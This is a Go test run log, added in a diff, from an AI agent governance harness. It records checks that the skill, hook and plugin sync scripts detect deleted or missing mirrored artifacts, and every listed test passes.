+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/scripts/git-operation-gate.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsgi352029058/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsgi352029058/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsgi352029058/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/scripts/hook-prereq-gate.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsho2247524873/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsho2247524873/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentsscriptsho2247524873/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/internal/embedded/assets/.opencode/plugin/governance.js
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting internal/embedded/assets/.opencode/plugin/governance.js; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.opencode/plugin/governance.js
+    sync_gates_guard_test.go:196: scripts/check-scripts-sync.sh stayed green after deleting .opencode/plugin/governance.js; output=
+        Validadores em sync: 32
+        Drift / missing: 0
+        Todos os validadores de evidencia sincronizados.
+=== NAME  TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh
+    sync_gates_guard_test.go:196: scripts/check-skills-sync.sh stayed green after deleting .agents/hooks/validate-preload.sh; output=SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentshooksvali1554894976/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentshooksvali1554894976/001/.agents/skills)
+        SKIP: tests (allowlist: dir nao-skill em /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSyncGatesFailWhenCentralArtifactIsDeleted.agentshooksvali1554894976/001/.agents/skills)
+        
+        Skills em sync: 87
+        Skills com drift: 0
+        Libs em sync: 2 libs x 2 mirrors (legacy + embedded)
+        Hooks do orquestrador em sync: 4 hooks x 7 mirrors
+        Hooks de validacao por-tool em paridade: 2 hooks x 6 tools
+        Gate de encerramento em paridade nos 4 agentes oficiais: 7 mirrors
+        Plugin do OpenCode presente e em paridade: internal/embedded/assets/.opencode/plugin/governance.js
+        Todos os mirrors sincronizados com .agents/skills/, .agents/lib/ e .agents/hooks/
+--- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted (0.00s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-session-end.sh (6.18s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md (6.04s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md (4.75s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh (4.76s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-session-end.sh (4.67s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/subagent-stop-wrapper.sh (4.39s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/post-execute-task.sh (4.09s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh (4.21s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh (4.23s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh (4.20s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/resolve-references.sh (4.50s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh (4.54s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh (4.50s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh (4.54s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh (4.08s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/.opencode/plugin/governance.js (3.89s)
+    --- PASS: TestSyncGatesFailWhenCentralArtifactIsDeleted/internal/embedded/assets/.opencode/plugin/governance.js (3.90s)
+--- PASS: TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror (0.00s)
+    --- PASS: TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.claude/skills (5.37s)
+    --- PASS: TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/internal/embedded/assets/.agents/skills (3.35s)
+    --- PASS: TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.github/skills (2.71s)
+PASS
+ok  	github.com/JailtonJunior94/ai-spec-harness/tests/integration	63.496s
+=== RUN   TestCanonicalDiagnosticsStayInSyncWithTheirEmittingScript
+=== PAUSE TestCanonicalDiagnosticsStayInSyncWithTheirEmittingScript
+=== RUN   TestPreToolDenialDiagnosticsCoverEveryLiveAgent
+=== PAUSE TestPreToolDenialDiagnosticsCoverEveryLiveAgent
+=== RUN   TestLiveMatrixHasTwelveCells
+=== PAUSE TestLiveMatrixHasTwelveCells
+=== RUN   TestAggregateCellResultsFailsWhenAnyCellSkipped
+=== PAUSE TestAggregateCellResultsFailsWhenAnyCellSkipped
+=== RUN   TestAggregateCellResultsPassesWhenNoCellSkipped
+=== PAUSE TestAggregateCellResultsPassesWhenNoCellSkipped
+=== CONT  TestCanonicalDiagnosticsStayInSyncWithTheirEmittingScript
+=== CONT  TestAggregateCellResultsFailsWhenAnyCellSkipped
+--- PASS: TestAggregateCellResultsFailsWhenAnyCellSkipped (0.00s)
+=== CONT  TestAggregateCellResultsPassesWhenNoCellSkipped
+=== CONT  TestLiveMatrixHasTwelveCells
+--- PASS: TestAggregateCellResultsPassesWhenNoCellSkipped (0.00s)
+--- PASS: TestLiveMatrixHasTwelveCells (0.00s)
+=== CONT  TestPreToolDenialDiagnosticsCoverEveryLiveAgent
+--- PASS: TestPreToolDenialDiagnosticsCoverEveryLiveAgent (0.00s)
+--- PASS: TestCanonicalDiagnosticsStayInSyncWithTheirEmittingScript (0.00s)
+PASS
+ok  	github.com/JailtonJunior94/ai-spec-harness/tests/integration/hooks_live	(cached)
+exit=0
